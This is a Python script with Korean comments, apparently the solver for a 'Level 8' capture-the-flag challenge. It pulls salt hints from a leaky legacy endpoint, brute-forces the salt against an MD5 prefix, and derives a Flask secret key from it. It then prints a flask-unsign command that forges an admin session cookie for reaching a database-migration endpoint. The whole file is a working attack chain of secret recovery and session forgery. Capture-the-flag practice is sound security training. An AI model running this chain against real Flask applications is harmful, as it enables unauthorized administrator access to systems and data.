#!/usr/bin/env python3
"""
Salt Bruteforce Script for Level 8 CTF

이 스크립트는 /api/legacy/get_salt 엔드포인트에서 얻은 힌트를 바탕으로
Salt 값을 브루트포스합니다.

힌트 정보:
- format: 'dictionary_word + number'
- length: Salt의 길이
- md5_prefix: MD5 해시의 앞 6자리 (검증용)
"""

import hashlib
import requests
import sys

def get_salt_hints(target_url):
    """서버에서 Salt 힌트 획득"""
    try:
        response = requests.get(f"{target_url}/api/legacy/get_salt", timeout=5)
        if response.status_code == 200:
            data = response.json()
            return data.get('hint', {})
        else:
            print(f"[!] 에러: HTTP {response.status_code}")
            return None
    except Exception as e:
        print(f"[!] 요청 실패: {e}")
        return None

def generate_wordlist():
    """일반적인 단어 리스트 생성"""
    # 회사/기업 관련 단어
    company_words = [
        'company', 'corp', 'enterprise', 'business', 'admin',
        'legacy', 'system', 'service', 'platform', 'micro'
    ]

    # CTF 관련 단어
    ctf_words = [
        'flag', 'ctf', 'challenge', 'hack', 'pwn',
        'secure', 'insane', 'dream', 'vulnerable'
    ]

    # 일반적인 단어
    common_words = [
        'password', 'secret', 'hidden', 'private', 'test',
        'demo', 'temp', 'old', 'backup', 'data'
    ]

    return company_words + ctf_words + common_words

def bruteforce_salt(hints):
    """Salt 브루트포스"""
    target_length = hints.get('length')
    target_prefix = hints.get('md5_prefix')
    format_hint = hints.get('format', '')

    print(f"[*] 타겟 정보:")
    print(f"    - 길이: {target_length}")
    print(f"    - MD5 prefix: {target_prefix}")
    print(f"    - 형식: {format_hint}")
    print()

    wordlist = generate_wordlist()
    attempts = 0

    print(f"[*] {len(wordlist)}개 단어로 브루트포스 시작...")
    print()

    for word in wordlist:
        # 숫자 범위 (0-9)
        for num in range(10):
            candidate = word + str(num)

            # 길이 체크
            if len(candidate) != target_length:
                continue

            attempts += 1

            # MD5 해시 계산
            md5_hash = hashlib.md5(candidate.encode()).hexdigest()

            # MD5 prefix 매칭 확인
            if md5_hash.startswith(target_prefix):
                print(f"[+] Salt 발견!")
                print(f"    Salt: {candidate}")
                print(f"    MD5: {md5_hash}")
                print(f"    시도 횟수: {attempts}")
                return candidate

            if attempts % 100 == 0:
                print(f"[*] {attempts} 시도 중... (현재: {candidate})")

    print(f"[!] Salt를 찾지 못했습니다 ({attempts} 시도)")
    return None

def calculate_secret_key(salt):
    """Salt로부터 Flask secret_key 계산"""
    full_hash = hashlib.sha256(salt.encode()).hexdigest()
    secret_key = full_hash[:32]

    print()
    print(f"[+] Secret Key 계산:")
    print(f"    Salt: {salt}")
    print(f"    SHA256: {full_hash}")
    print(f"    Secret Key (32자): {secret_key}")

    return secret_key

def main():
    if len(sys.argv) < 2:
        print("사용법: python3 bruteforce_salt.py <TARGET_URL>")
        print("예시: python3 bruteforce_salt.py http://localhost:5000")
        sys.exit(1)

    target_url = sys.argv[1].rstrip('/')

    print("=" * 60)
    print("  Salt Bruteforce Tool - Level 8 CTF")
    print("=" * 60)
    print()

    # Step 1: 힌트 획득
    print("[*] Step 1: Salt 힌트 획득 중...")
    hints = get_salt_hints(target_url)

    if not hints:
        print("[!] 힌트를 가져올 수 없습니다")
        sys.exit(1)

    print("[+] 힌트 획득 성공")
    print()

    # Step 2: 브루트포스
    print("[*] Step 2: Salt 브루트포스...")
    salt = bruteforce_salt(hints)

    if not salt:
        print()
        print("[!] 더 많은 단어를 시도하거나 워드리스트를 확장하세요")
        sys.exit(1)

    # Step 3: Secret Key 계산
    print()
    print("[*] Step 3: Flask Secret Key 계산...")
    secret_key = calculate_secret_key(salt)

    print()
    print("=" * 60)
    print("  완료!")
    print("=" * 60)
    print()
    print("다음 단계:")
    print("  1. flask-unsign을 사용하여 admin 세션 생성:")
    print(f"     flask-unsign --sign --cookie \"{{\'role\': \'admin\'}}\" --secret \"{secret_key}\"")
    print()
    print("  2. 생성된 세션 쿠키를 사용하여 /api/admin/db/migrate 접근")
    print()

if __name__ == "__main__":
    main()
